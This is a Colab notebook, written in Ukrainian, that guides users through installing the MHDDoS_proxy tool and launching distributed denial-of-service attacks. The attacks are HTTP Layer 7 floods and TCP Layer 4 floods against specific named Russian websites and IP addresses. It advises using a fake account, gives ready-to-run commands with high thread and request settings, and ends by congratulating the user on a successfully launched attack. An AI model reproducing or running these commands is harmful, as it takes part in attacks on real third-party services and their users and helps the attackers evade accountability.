# %% [markdown]
# <a href="https://colab.research.google.com/github/xacer2005/Coloboration/blob/main/%D0%A1%D0%BB%D0%B0%D0%B2%D0%B0_%D0%A3%D0%BA%D1%80%D0%B0%D1%97%D0%BD%D1%96_%22%D1%82%D1%83%D1%82%D0%BE%D1%80_MHDDoS_proxy_%D0%B2_Colaboratory%22.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# тиць сюди, якщо ти з GitHub

# %% [markdown]
# # MHDDoS_proxy
#
# Переконайтеся, що ви зайшли з фейкового акаунта
# <br>
# Запускаємо код що під цим повідомленням, натискаємо:
# Ctrl + Enter, або збоку коду кнопку << **запуска** >>
# Чєкаємо поки встановиться MHDDoS_proxy

# %%
# %cd ~
# %rm -rf mhddos_proxy &> /dev/null
# !git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
# %cd ~/mhddos_proxy
# !python3 -m pip install -r requirements.txt

# %% [markdown]
# ### HTTP attack
#  Якщо хочеш атаку по **Layer7**, тобто по http **(Запусти код нище)**
#  Потужніша але повілніша, не така стабільна як по TCP

# %%
# !python runner.py  https://payanyway.ru https://www.avtovokzaly.ru https://bus.tutu.ru https://185.111.86.13:443  -t 3000 -p 1200 --rpc 1500 --http-methods GET DGB STRESS  --table

# %% [markdown]
# ### TCP Flood Bypass
# Якщо хочеш атаку по **Layer4**, тобто по **TCP (Запусти код нище)**
# Слабаша але швидка, більш стабільна в роботі

# %%
# !python runner.py  tcp://185.111.86.13:80 tcp://185.111.86.13:443 tcp://185.129.100.80:80 tcp://185.129.100.80:443 tcp://178.248.236.15:80 tcp://178.248.236.15:443 tcp://185.111.86.13:443  -t 3000 -p 1200 --rpc 1500 --table

# %% [markdown]
# Вітаю браття та сестри атака успішно запущена.
# **Все буде Україна!**
